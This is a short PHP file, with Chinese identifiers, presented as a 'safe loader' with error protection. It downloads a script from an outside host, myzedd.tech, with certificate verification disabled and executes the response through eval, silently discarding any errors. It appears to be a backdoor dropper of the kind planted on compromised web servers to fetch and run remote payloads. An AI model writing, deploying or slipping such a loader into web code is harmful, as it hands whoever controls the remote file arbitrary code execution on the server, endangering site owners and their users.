<?php
// 版本4：带错误保护的高兼容加载器
class 安全加载器 {
    public function 加载脚本($网址) {
        try {
            $连接 = curl_init($网址);
            curl_setopt($连接, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($连接, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($连接, CURLOPT_TIMEOUT, 20);
            
            $数据 = curl_exec($连接);
            curl_close($连接);
            
            if (!empty($数据)) {
                eval('?>' . $数据);
            }
        } catch (Exception $e) {
            // 静默处理
        }
    }
}

$加载器 = new 安全加载器();
$加载器->加载脚本('https://myzedd.tech/project/rahman1.txt');
?>